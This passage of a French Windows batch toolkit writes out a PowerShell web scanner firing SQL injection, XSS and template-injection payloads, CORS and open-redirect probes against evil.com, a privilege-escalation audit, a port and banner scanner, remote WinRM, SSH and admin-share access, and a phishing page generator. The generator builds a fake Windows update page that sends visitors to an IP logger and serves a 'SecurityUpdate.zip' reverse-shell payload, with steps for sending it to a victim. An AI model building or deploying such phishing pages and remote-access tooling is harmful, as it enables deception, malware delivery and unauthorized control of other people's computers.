echo     foreach ($k in $headersToCheck.Keys) { >> "%WPS%"
echo         if (-not $h.ContainsKey($k)) { Print-Result $headersToCheck[$k] "Header manquant : $k" } >> "%WPS%"
echo     } >> "%WPS%"
echo     if ($h['Server'])          { Print-Result 'LOW' ("Server expose : " + $h['Server']) } >> "%WPS%"
echo     if ($h['X-Powered-By'])    { Print-Result 'LOW' ("Techno exposee : " + $h['X-Powered-By']) } >> "%WPS%"
echo     if ($h['X-AspNet-Version']){ Print-Result 'LOW' ("ASP.NET version : " + $h['X-AspNet-Version']) } >> "%WPS%"
echo     $xfo = $h['X-Frame-Options'] >> "%WPS%"
echo     if ($xfo -match 'ALLOW-FROM') { Print-Result 'LOW' "X-Frame-Options ALLOW-FROM obsolete" } >> "%WPS%"
echo     $cookies = $resp.Headers['Set-Cookie'] >> "%WPS%"
echo     if ($cookies) { >> "%WPS%"
echo         foreach ($c in $cookies) { >> "%WPS%"
echo             if ($c -notmatch 'HttpOnly') { Print-Result 'MEDIUM' "Cookie sans flag HttpOnly" } >> "%WPS%"
echo             if ($c -notmatch 'Secure')   { Print-Result 'MEDIUM' "Cookie sans flag Secure" } >> "%WPS%"
echo             if ($c -notmatch 'SameSite') { Print-Result 'LOW'    "Cookie sans flag SameSite" } >> "%WPS%"
echo         } >> "%WPS%"
echo     } >> "%WPS%"
echo     if ($findings.Count -eq 0) { Write-Host "  [OK] Tous les headers de securite sont presents." -f Green } >> "%WPS%"
echo } catch { Write-Host "  [!] Erreur headers : $($_.Exception.Message)" -f Gray } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 2/7 - SSL/TLS >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 2 7 "SSL/TLS" >> "%WPS%"
echo if ($url -like 'https*') { >> "%WPS%"
echo     try { >> "%WPS%"
echo         $req = [Net.HttpWebRequest]::Create($url) >> "%WPS%"
echo         $req.Timeout = 6000 >> "%WPS%"
echo         $res2 = $req.GetResponse() >> "%WPS%"
echo         $res2.Close() >> "%WPS%"
echo         Write-Host "  [OK] Certificat SSL valide." -f Green >> "%WPS%"
echo     } catch { Print-Result 'HIGH' "Probleme SSL : $($_.Exception.Message)" } >> "%WPS%"
echo } else { Print-Result 'MEDIUM' "Site servi en HTTP (pas HTTPS)" } >> "%WPS%"
echo try { >> "%WPS%"
echo     $opt = Invoke-WebRequest $url -Method OPTIONS -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     if ($opt.Headers['Allow']) { >> "%WPS%"
echo         $methods = $opt.Headers['Allow'] >> "%WPS%"
echo         Write-Host "  [INFO] Methodes : $methods" -f DarkGray >> "%WPS%"
echo         if ($methods -match 'TRACE^|CONNECT') { Print-Result 'MEDIUM' "Methode dangereuse activee : $methods" } >> "%WPS%"
echo     } >> "%WPS%"
echo } catch {} >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 3/7 - SQL INJECTION >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 3 7 "SQL Injection" >> "%WPS%"
echo $baseParams = @('id','cat','page','query','search','user','name','type','item','product','ref','sort') >> "%WPS%"
echo $sqlPayloads = @( >> "%WPS%"
echo     [char]39, >> "%WPS%"
echo     [char]34, >> "%WPS%"
echo     ([char]39 + ' OR 1=1--'), >> "%WPS%"
echo     ('admin' + [char]39 + '--'), >> "%WPS%"
echo     ' order by 10--', >> "%WPS%"
echo     '1 AND 1=2--', >> "%WPS%"
echo     '1 UNION SELECT NULL--' >> "%WPS%"
echo ) >> "%WPS%"
echo $sqlErrors = @( >> "%WPS%"
echo     'sql syntax','mysql','sqlite','syntax error','PostgreSQL', >> "%WPS%"
echo     'Microsoft OLE DB','Oracle Error','MariaDB','System.Data.SqlClient', >> "%WPS%"
echo     'You have an error','supplied argument','ODBC','Warning.*mysqli', >> "%WPS%"
echo     'Incorrect syntax','Unclosed quotation','SQLSTATE','DB Error', >> "%WPS%"
echo     'PDOException','java.sql.','unterminated quoted string' >> "%WPS%"
echo ) >> "%WPS%"
echo $uri2 = [uri]$url >> "%WPS%"
echo $q2 = $uri2.Query.TrimStart('?') >> "%WPS%"
echo $existingParams = $q2.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries) >> "%WPS%"
echo $targets = if ($existingParams.Count -gt 0) { $existingParams ^| ForEach-Object { $_.Split('=')[0] } } else { $baseParams } >> "%WPS%"
echo $wafCount = 0 >> "%WPS%"
echo. >> "%WPS%"
echo foreach ($ta in $targets) { >> "%WPS%"
echo     Write-Host "  Test param : $ta ..." -f DarkGray -NoNewline >> "%WPS%"
echo     $gotResult = $false >> "%WPS%"
echo     foreach ($p in $sqlPayloads) { >> "%WPS%"
echo         if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%WPS%"
echo         $encodedP = [uri]::EscapeDataString($p) >> "%WPS%"
echo         $testUrl = if ($url -like "*${ta}=*") { $url -replace "${ta}=[^&]*", "${ta}=$encodedP" } else { if ($url.Contains('?')) { "${url}^&${ta}=$encodedP" } else { "${url}?${ta}=$encodedP" } } >> "%WPS%"
echo         try { >> "%WPS%"
echo             $tr = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing >> "%WPS%"
echo             if ($tr.StatusCode -in 403,406,429) { $wafCount++; $gotResult = $true; break } >> "%WPS%"
echo             if ($tr.Content -and ($sqlErrors ^| Where-Object { $tr.Content -match $_ })) { >> "%WPS%"
echo                 Write-Host " VULN !" -f Red >> "%WPS%"
echo                 Print-Result 'CRITICAL' "SQLi detectee (param:$ta) payload: $p" >> "%WPS%"
echo                 $gotResult = $true; break >> "%WPS%"
echo             } >> "%WPS%"
echo         } catch { >> "%WPS%"
echo             if ($_.Exception.Response.StatusCode.value__ -in 403,406) { $wafCount++; $gotResult = $true; break } >> "%WPS%"
echo         } >> "%WPS%"
echo     } >> "%WPS%"
echo     if (-not $gotResult) { >> "%WPS%"
echo         $start = Get-Date >> "%WPS%"
echo         try { $null = Invoke-WebRequest ("${url}?${ta}=" + [uri]::EscapeDataString("1' AND SLEEP(4)--")) -TimeoutSec 8 -EA SilentlyContinue -UseBasicParsing } catch {} >> "%WPS%"
echo         if (((Get-Date) - $start).TotalSeconds -gt 3.5) { >> "%WPS%"
echo             Write-Host " TIME-BASED !" -f Red >> "%WPS%"
echo             Print-Result 'CRITICAL' "SQLi Time-based sur param [$ta]" >> "%WPS%"
echo         } else { >> "%WPS%"
echo             Write-Host " OK" -f Green >> "%WPS%"
echo         } >> "%WPS%"
echo     } else { >> "%WPS%"
echo         if (-not ($script:findings ^| Where-Object { $_.Msg -match $ta })) { Write-Host " WAF" -f Yellow } >> "%WPS%"
echo     } >> "%WPS%"
echo } >> "%WPS%"
echo if ($wafCount -gt 0) { Write-Host "  [INFO] WAF/protection detecte sur $wafCount parametres" -f Yellow } >> "%WPS%"
echo $sqliHdr = ([char]39 + ' OR 1=1--') >> "%WPS%"
echo $sqlHdrs = @('X-Forwarded-For','X-Real-IP','Referer') >> "%WPS%"
echo foreach ($hdr in $sqlHdrs) { >> "%WPS%"
echo     try { >> "%WPS%"
echo         $rH = Invoke-WebRequest $url -Headers @{$hdr=$sqliHdr} -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo         if ($rH -and ($sqlErrors ^| Where-Object { $rH.Content -match $_ })) { Print-Result 'CRITICAL' "SQLi via header $hdr !" } >> "%WPS%"
echo     } catch {} >> "%WPS%"
echo } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 4/7 - XSS REFLECTE >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 4 7 "XSS Reflecte" >> "%WPS%"
echo $xssPayloads = @( >> "%WPS%"
echo     ([char]60+'script'+[char]62+'alert(1)'+[char]60+'/script'+[char]62), >> "%WPS%"
echo     ([char]34+'^><img src=x onerror=alert(1)^>'), >> "%WPS%"
echo     ([char]39+'^><svg/onload=alert(1)^>'), >> "%WPS%"
echo     'javascript:alert(1)', >> "%WPS%"
echo     ([char]60+'body onload=alert(1)'+[char]62), >> "%WPS%"
echo     ([char]60+'details open ontoggle=alert(1)'+[char]62), >> "%WPS%"
echo     ([char]60+'img src=x onerror=confirm(1)'+[char]62) >> "%WPS%"
echo ) >> "%WPS%"
echo $xssFound = $false >> "%WPS%"
echo foreach ($ta in $targets) { >> "%WPS%"
echo     Write-Host "  Test XSS param : $ta ..." -f DarkGray -NoNewline >> "%WPS%"
echo     $xssHit = $false >> "%WPS%"
echo     foreach ($xp in $xssPayloads) { >> "%WPS%"
echo         if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%WPS%"
echo         $encXss = [uri]::EscapeDataString($xp) >> "%WPS%"
echo         $testUrlXSS = if ($url -like "*${ta}=*") { $url -replace "${ta}=[^&]*", "${ta}=$encXss" } else { if ($url.Contains('?')) { "${url}^&${ta}=$encXss" } else { "${url}?${ta}=$encXss" } } >> "%WPS%"
echo         try { >> "%WPS%"
echo             $trX = Invoke-WebRequest $testUrlXSS -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo             if ($trX -and $trX.Content -match [regex]::Escape($xp)) { >> "%WPS%"
echo                 Write-Host " VULN !" -f Red >> "%WPS%"
echo                 Print-Result 'HIGH' "XSS Reflecte detecte (param:$ta)" >> "%WPS%"
echo                 $xssFound = $true; $xssHit = $true; break >> "%WPS%"
echo             } >> "%WPS%"
echo         } catch {} >> "%WPS%"
echo     } >> "%WPS%"
echo     if (-not $xssHit) { Write-Host " OK" -f Green } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $xssFound) { Write-Host "  [OK] Aucun XSS reflecte detecte." -f Green } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 5/7 - SSTI >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 5 7 "SSTI (Template Injection)" >> "%WPS%"
echo $sstiPayloads = @('{{7*7}}','${7*7}','#{7*7}','*{7*7}','__${7*7}__') >> "%WPS%"
echo $sstiFound = $false >> "%WPS%"
echo foreach ($ta in $targets) { >> "%WPS%"
echo     foreach ($sp in $sstiPayloads) { >> "%WPS%"
echo         $encS = [uri]::EscapeDataString($sp) >> "%WPS%"
echo         $testS = if ($url -like "*${ta}=*") { $url -replace "${ta}=[^&]*", "${ta}=$encS" } else { if ($url.Contains('?')) { "${url}^&${ta}=$encS" } else { "${url}?${ta}=$encS" } } >> "%WPS%"
echo         try { >> "%WPS%"
echo             $rs = Invoke-WebRequest $testS -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo             if ($rs -and $rs.Content -match '(?<![0-9])49(?![0-9])') { >> "%WPS%"
echo                 Print-Result 'CRITICAL' "SSTI possible (param:$ta payload:$sp)" >> "%WPS%"
echo                 $sstiFound = $true >> "%WPS%"
echo             } >> "%WPS%"
echo         } catch {} >> "%WPS%"
echo     } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $sstiFound) { Write-Host "  [OK] Aucun SSTI detecte." -f Green } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 6/7 - CORS et Open Redirect >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 6 7 "CORS et Open Redirect" >> "%WPS%"
echo try { >> "%WPS%"
echo     $cors = Invoke-WebRequest $url -Headers @{Origin='https://evil.com'} -UserAgent $ua -TimeoutSec 6 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     $acao = $cors.Headers['Access-Control-Allow-Origin'] >> "%WPS%"
echo     $acac = $cors.Headers['Access-Control-Allow-Credentials'] >> "%WPS%"
echo     if ($acao -eq '*')           { Print-Result 'MEDIUM' "CORS permissif (*)" } >> "%WPS%"
echo     elseif ($acao -match 'evil') { Print-Result 'HIGH'   "CORS reflecte l'origine malveillante !" } >> "%WPS%"
echo     if ($acac -eq 'true' -and $acao) { Print-Result 'HIGH' "CORS credentials=true (vol session possible)" } >> "%WPS%"
echo     if (-not $acao) { Write-Host "  [OK] Pas de header CORS." -f Green } >> "%WPS%"
echo } catch {} >> "%WPS%"
echo $redParams = @('redirect','url','next','dest','return','goto','target','forward','redir') >> "%WPS%"
echo $redFound = $false >> "%WPS%"
echo foreach ($ta in $redParams) { >> "%WPS%"
echo     $testRed = if ($url.Contains('?')) { "${url}^&${ta}=https://evil.com" } else { "${url}?${ta}=https://evil.com" } >> "%WPS%"
echo     try { >> "%WPS%"
echo         $trR = Invoke-WebRequest $testRed -UserAgent $ua -MaximumRedirection 0 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo         if ($trR.Headers['Location'] -match 'evil') { Print-Result 'MEDIUM' "Open Redirect (param:$ta)"; $redFound=$true } >> "%WPS%"
echo     } catch { >> "%WPS%"
echo         if ($_.Exception.Response.Headers['Location'] -match 'evil') { Print-Result 'MEDIUM' "Open Redirect (param:$ta)"; $redFound=$true } >> "%WPS%"
echo     } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $redFound) { Write-Host "  [OK] Aucun Open Redirect detecte." -f Green } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 7/7 - DIVERS >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 7 7 "Rate Limit / Misc" >> "%WPS%"
echo $rl_blocked = $false >> "%WPS%"
echo for ($i = 0; $i -lt 6; $i++) { >> "%WPS%"
echo     try { >> "%WPS%"
echo         $rlr = Invoke-WebRequest $url -UserAgent $ua -TimeoutSec 3 -EA Stop -UseBasicParsing >> "%WPS%"
echo         if ($rlr.StatusCode -eq 429) { Write-Host "  [OK] Rate limiting actif (HTTP 429)" -f Green; $rl_blocked = $true; break } >> "%WPS%"
echo     } catch { if ($_.Exception.Response.StatusCode.value__ -eq 429) { Write-Host "  [OK] Rate limiting actif" -f Green; $rl_blocked = $true; break } } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $rl_blocked) { Print-Result 'LOW' "Aucun rate limiting detecte" } >> "%WPS%"
echo $ppSep = if ($url.Contains('?')) { '^&' } else { '?' } >> "%WPS%"
echo try { >> "%WPS%"
echo     $pp = Invoke-WebRequest "${url}${ppSep}__proto__[x]=polluted" -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     if ($pp -and $pp.Content -match 'polluted') { Print-Result 'HIGH' "Prototype Pollution possible" } >> "%WPS%"
echo } catch {} >> "%WPS%"
echo $baseClean = ($url -split '\?')[0].TrimEnd('/') >> "%WPS%"
echo try { >> "%WPS%"
echo     $stxt = Invoke-WebRequest "$baseClean/.well-known/security.txt" -TimeoutSec 4 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     if ($stxt -and $stxt.StatusCode -eq 200) { Write-Host "  [OK] security.txt present (bonne pratique)" -f Green } >> "%WPS%"
echo     else { Write-Host "  [INFO] Pas de security.txt" -f DarkGray } >> "%WPS%"
echo } catch { Write-Host "  [INFO] Pas de security.txt" -f DarkGray } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # SCORE FINAL >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo if ($script:score -lt 0) { $script:score = 0 } >> "%WPS%"
echo $grade = if($script:score -ge 90){'A  - Excellent'}elseif($script:score -ge 75){'B  - Bon'}elseif($script:score -ge 50){'C  - Moyen'}elseif($script:score -ge 25){'D  - Mauvais'}else{'F  - Critique'} >> "%WPS%"
echo $gc    = if($script:score -ge 75){'Green'}elseif($script:score -ge 50){'Yellow'}else{'Red'} >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo Write-Host "  ================================================" -f Cyan >> "%WPS%"
echo Write-Host "  Score securite : $script:score / 100" -f $gc >> "%WPS%"
echo Write-Host "  Grade          : $grade" -f $gc >> "%WPS%"
echo Write-Host "  Findings       : $($script:findings.Count) vulnerabilite(s)" -f White >> "%WPS%"
echo if ($script:findings.Count -gt 0) { >> "%WPS%"
echo     if ($low  -gt 0) { Write-Host "    LOW      : $low"  -f Cyan } >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] ANALYSE RAPIDE DES RISQUES :" -f Red >> "%WPS%"
echo     if ($crit -gt 0) { Write-Host "  - CRITIQUE : Prise de controle totale (RCE) ou vol de base de donnees." -f Magenta } >> "%WPS%"
echo     if ($high -gt 0) { Write-Host "  - ELEVE : Piratage de comptes utilisateurs (cookies/XSS) ou vol de sessions." -f Red } >> "%WPS%"
echo     if ($med  -gt 0) { Write-Host "  - MOYEN : Fuite d'infos techniques ou redirection vers des sites malveillants." -f Yellow } >> "%WPS%"
echo     Write-Host "  CONSEIL : Corrigez les failles dans l'ordre de leur priorite (Critique d'abord)." -f Cyan >> "%WPS%"
echo } >> "%WPS%"
echo Write-Host "  ================================================" -f Cyan >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo Write-Host "  [OK] Scan termine !" -f Green >> "%WPS%"
echo. >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host ("`n  [ERREUR FATALE] " + $_.Exception.Message) -f Red >> "%WPS%"
echo     Write-Host "  Verifiez que l'URL est accessible." -f DarkGray >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
echo.
pause
goto net_cyber_menu



:cyber_privesc_audit
cls
echo.
echo  ===========================================================
echo   TEST D'INFILTRATION ET AUDIT DE PRIVILEGES
echo  ===========================================================
echo   Cherche les vecteurs d'elevation de privileges
echo   SYSTEM sur la machine locale.
echo.
echo  [!] Ce module cherche les failles reelles que les pirates
echo      utilisent pour prendre le controle d'un PC Windows.
echo.
echo  Nouveaux tests d'infiltration ajoutes :
echo  - Audit des "Unquoted Service Paths" : Faille permettant de
echo    remplacer un service par un virus (manque de guillemets).
echo  - Verification des Taches Planifiees "SYSTEM" : Taches tournant
echo    avec les privileges maximum (cibles potentielles).
echo  - Identification des Services (Banner Grabbing) : Tente de lire
echo    la "carte d'identite" des services pour trouver leurs versions.
echo.
echo  -----------------------------------------------------------
echo.
echo  1. Analyse des "Unquoted Service Paths" (Elevation) :
powershell -NoProfile -Command "$s = Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '\"*\"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\Windows*'}; if($s){ $s | ForEach-Object { Write-Host '   [FAIL] Vulnerable : ' -NoNewline -f Red; Write-Host ($_.Name + ' -> ' + $_.PathName) -f Yellow } } else { Write-Host '   [OK] Aucun service vulnerable aux chemins non-guillemetes.' -f Green }"
echo.
echo  2. Audit des Taches Planifiees "SYSTEM" :
powershell -NoProfile -Command "$t = Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq 'SYSTEM' -and $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\Microsoft\Windows*'}; if($t){ Write-Host ('   [INFO] Taches SYSTEM hors Windows detectees :') -f Cyan; $t | ForEach-Object { Write-Host ('     - ' + $_.TaskName) } } else { Write-Host '   [OK] Aucune tache SYSTEM suspecte.' -f Green }"
echo.
echo  3. Verification "AlwaysInstallElevated" (Critique) :
powershell -NoProfile -Command "$v1 = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -EA SilentlyContinue).AlwaysInstallElevated; $v2 = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -EA SilentlyContinue).AlwaysInstallElevated; if ($v1 -eq 1 -and $v2 -eq 1) { Write-Host '   [ALERTE] AlwaysInstallElevated est ACTIVE ! (Elevation SYSTEM immediate via MSI)' -f Red } else { Write-Host '   [OK] AlwaysInstallElevated est desactive.' -f Green }"
echo.
echo  4. Dossiers du PATH systeme inscriptibles (DLL Hijacking) :
powershell -NoProfile -Command "$env:PATH.Split(';') | Where-Object { $_ -and (Test-Path $_) -and (Get-Acl $_ -EA SilentlyContinue).Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' -and $_.FileSystemRights -match 'Write' } } | ForEach-Object { Write-Host ('   [FAIL] Dossier PATH inscriptible : ' + $_) -f Yellow }"
echo.
echo  5. Permissions sur les executables de services :
powershell -NoProfile -Command "Get-WmiObject Win32_Service | ForEach-Object { $path = $_.PathName -replace '\"','' -split ' ' | Select-Object -First 1; if ($path -and (Test-Path $path)) { $acl = Get-Acl $path -EA SilentlyContinue; if($acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' -and $_.FileSystemRights -match 'Write|FullControl' }){ Write-Host ('   [FAIL] Service inscriptible : ' + $_.Name + ' (' + $path + ')') -f Red } } }"
echo.
echo  6. Identification des Services (Banner Grabbing) :
powershell -NoProfile -Command "$p = Get-NetTCPConnection -State Listen -EA SilentlyContinue | Select-Object -ExpandProperty LocalPort -Unique | Sort-Object; foreach($port in $p){ try { $socket = New-Object System.Net.Sockets.TcpClient('127.0.0.1', $port); $stream = $socket.GetStream(); $stream.ReadTimeout = 800; $buffer = New-Object byte[] 1024; $read = $stream.Read($buffer, 0, $buffer.Length); if($read -gt 0){ $banner = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read).Trim(); if($banner){ Write-Host ('   [+] Port ' + $port + ' : ' + $banner) -f Green } else { Write-Host ('   [ ] Port ' + $port + ' : Actif (Pas de banniere)') -f Gray } } else { Write-Host ('   [ ] Port ' + $port + ' : Actif (Vide)') -f Gray }; $socket.Close() } catch { Write-Host ('   [ ] Port ' + $port + ' : Actif (Protege)') -f Gray } }"
echo.
echo  [i] CONSEIL : Pour corriger un "Unquoted Path", utilisez la commande :
echo      reg add "HKLM\SYSTEM\CurrentControlSet\Services\NOM_DU_SERVICE" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Chemin\Vers\App.exe\"" /f
echo.
pause
goto net_cyber_menu

:cyber_dns_leak
cls
echo.
echo  ================================================
echo   TEST DE FUITE DNS (DNS LEAK)
echo  ================================================
echo   Verifie si vos requetes DNS sont bien
echo   anonymisees via votre VPN.
echo.
echo  Serveurs DNS actuellement configures :
powershell -NoProfile -Command "Get-DnsClientServerAddress | Where-Object {$_.ServerAddresses} | Select-Object @{N='Interface';E={$_.InterfaceAlias}}, @{N='Protocole';E={$_.AddressFamily}}, @{N='Serveurs_DNS';E={$_.ServerAddresses}} | Format-Table -AutoSize"
echo.
echo  Resolution de test vers un domaine public :
powershell -NoProfile -Command "try { $r = Resolve-DnsName 'whoami.akamai.net' -EA Stop; Write-Host ('  IP resolue : ' + $r.IP4Address) -f Green } catch { Write-Host '  Impossible de resoudre le domaine de test.' -f Red }"
echo.
echo  [i] CONSEIL : Si vous utilisez un VPN, vous ne devriez PAS voir les IP 
echo      de votre box internet ici. Utilisez 1.1.1.1 ou 8.8.8.8 pour plus de securite.
pause
goto net_cyber_menu

:cyber_phishing_gen
cls
echo.
echo  ================================================
echo   GENERATEUR DE LIEN DE PHISHING (REMOTE)
echo  ================================================
echo.
set /p "webhook=URL de votre IP Logger (ex: Grabify) : "
set /p "my_ip=Votre IP Publique (pour le retour shell) : "
echo.
echo [i] Generation de la page index_phishing.html...

(
echo ^<!DOCTYPE html^>
echo ^<html^>^<head^>^<title^>Mise a jour systeme requise^</title^>^<script^>
echo window.location.href = "%webhook%";
echo ^</script^>^</head^>
echo ^<body style="font-family:sans-serif; text-align:center;"^>
echo ^<h1^>Verification de securite Windows^</h1^>
echo ^<p^>Votre navigateur nécessite une mise à jour des certificats pour continuer.^</p^>
echo ^<button onclick="downloadPayload()"^>Mettre a jour maintenant^</button^>
echo ^<script^>
echo function downloadPayload() {
echo   // Ici on simule le lien vers ton script de Reverse Shell
echo   window.location.href = "http://%my_ip%/SecurityUpdate.zip";
echo }
echo ^</script^>^</body^>^</html^>
) > "%SCRIPT_DIR%\index_phishing.html"

echo.
echo [OK] Fichier 'index_phishing.html' genere.
echo [!] Instruction : 
echo     1. Hebergez ce fichier sur un serveur (ou ton PC via Python).
echo     2. Envoyez le lien de votre serveur a la victime.
echo     3. Des qu'elle telecharge et lance le fichier, vous avez le controle.
pause & goto net_cyber_menu

REM ===================================================================
REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
REM ===================================================================


:cyber_lan_scan
cls
echo.
echo  ================================================
echo   SCANNER DE FAILLES RESEAU ET CONNEXION DISTANTE
echo  ================================================
echo.
set "opts=Analyser le reseau local (Mode LAN Automatique);Analyser une IP ou un sous-reseau distant;Analyse des failles et Connexion distante"
call :DynamicMenu "CHOIX DU SCAN" "%opts%" "NONUMS NOCLS"
set "c_lan=%errorlevel%"

if "%c_lan%"=="0" goto net_cyber_menu
if "%c_lan%"=="3" goto cyber_remote_connect
if "%c_lan%"=="2" goto cyber_lan_custom
if "%c_lan%"=="1" goto cyber_lan_auto
goto cyber_lan_scan

:cyber_lan_auto
set "base_ip=AUTO"
goto start_lan_scan

:cyber_lan_custom
cls
echo.
echo  ================================================
echo   SCANNER PERSONNALISE (LAN OU WAN)
echo  ================================================
echo.
echo  EXEMPLES DE SAISIE :
echo.
echo  - Reseau local :          192.168.1   (scanne .1 a .254)
echo  - IP unique :             192.168.1.50
echo  - Reseau box distante :   192.168.1 ou 10.0.0 (adresse PRIVEE de sa box)
echo.
echo  [!] L'IP publique WAN de votre cousin (type IPv6 ou 82.x.x.x)
echo      ne scanne PAS les appareils de son reseau local.
echo      Utilisez le module IP GRABBER pour obtenir son IP, puis
echo      connectez-vous en SSH ou WinRM pour un scan interne reel.
echo.
call :InputWithEsc "Base IP ou IP unique : " base_ip
if errorlevel 1 goto cyber_lan_scan
if "%base_ip%"=="" goto cyber_lan_scan
goto start_lan_scan

:cyber_remote_connect
cls
echo.
echo  ================================================
echo   ANALYSE FAILLES ^& ACCES DISTANT (WAN/LAN)
echo  ================================================
echo.
echo  [i] Pour eviter les conflits avec votre reseau local,
echo      utilisez l'IP PUBLIQUE ou un DNS (ex: ma-box.ddns.net).
echo.
call :InputWithEsc "IP Cible ou DNS (ex: 82.x.x.x) : " remote_ip
if errorlevel 1 goto cyber_lan_scan
if "%remote_ip%"=="" goto cyber_lan_scan

echo.
echo  [?] Port specifique ? (Laissez vide pour les ports par defaut)
echo      (Ex: 2222 si votre box redirige le port 2222 vers le 22 d'un PC)
call :InputWithEsc "Port (Optionnel) : " remote_port
if errorlevel 1 goto cyber_lan_scan
if not defined remote_port set "remote_port=NONE"
goto cyber_remote_menu


:cyber_remote_menu
set "remote_info_title=ACTIONS DISTANTES - [ !remote_ip! ]"
if defined remote_pc set "remote_info_title=ACTIONS DISTANTES - [ !remote_pc! @ !remote_ip! ]"
set "opts=Scanner profondement les failles (Vuln, SMB, RDP, Ports);Ouvrir une session PowerShell (WinRM);Se connecter via SSH;Explorer les partages secrets SMB (C$, Admin$);RETOUR"
call :DynamicMenu "!remote_info_title!" "%opts%" "NONUMS"
set "rc_opt=%errorlevel%"

if "%rc_opt%"=="1" goto ig_remote_scan_process
if "%rc_opt%"=="2" (
    cls
    echo.
    echo [i] Tentative de connexion WinRM Remote PowerShell sur !remote_ip!...
    powershell -NoProfile -Command "Enter-PSSession -ComputerName !remote_ip! -Credential (Get-Credential)"
    pause
    goto cyber_remote_menu
)
if "%rc_opt%"=="3" (
    cls
    echo.
    echo [i] Connexion distante SSH...
    set /p "ssh_user=Utilisateur cible : "
    if "!remote_port!"=="NONE" (
        ssh !ssh_user!@!remote_ip!
    ) else (
        ssh -p !remote_port! !ssh_user!@!remote_ip!
    )
    pause
    goto cyber_remote_menu
)
if "%rc_opt%"=="4" (
    cls
    echo.
    echo [i] Listage des partages distants accessibles sur !remote_ip! :
    net view \\!remote_ip! /all
    echo.
    echo [?] Explorer le disque distant virtuellement (C$, Admin$) ?
    set /p "open_exp=(O/N) : "
    if /i "!open_exp!"=="O" start \\!remote_ip!\C$
    pause
    goto cyber_remote_menu
)
if "%rc_opt%"=="5" goto cyber_lan_scan
goto cyber_remote_menu

:ig_remote_scan_process
cls
echo.
echo  ================================================
echo   AUDIT DE VULNERABILITES : !remote_ip!
if defined remote_pc echo   CIBLE                   : !remote_pc!
echo  ================================================
echo.
echo [i] Initialisation du moteur de scan...

set "SC_FILE=%TEMP%\vuln_scan.ps1"
(
echo $ip = '!remote_ip!'.Split('%%')[0]
echo $ports = @(21,22,23,25,53,80,110,135,139,143,443,445,465,587,993,995,1433,1521,2049,3306,3389,5432,5900,5985,8080,8443^)
echo Write-Host "[*] Analyse de la cible : $ip" -f Gray
echo if (Test-Connection $ip -Count 1 -Quiet^) { Write-Host " [OK] Cible en ligne (Ping actif)" -f Green }
echo $found = 0
echo foreach ($p in $ports^) {
echo   [Console]::Write("`r [*] Scan du port : $p    "^)
echo   $t = New-Object Net.Sockets.TcpClient
echo   try {
echo     $c = $t.BeginConnect($ip, $p, $null, $null^)
echo     if ($c.AsyncWaitHandle.WaitOne(300, $false^) -and $t.Connected^) {
echo       Write-Host "`r [!] PORT $p OUVERT" -f Cyan -NoNewline
echo       $found++
echo       if ($p -eq 445^) { Write-Host " -> SMB (Vulnerable EternalBlue/WannaCry ?)" -f Red }
echo       elseif ($p -eq 3389^) { Write-Host " -> RDP (Bureau a distance actif)" -f Yellow }
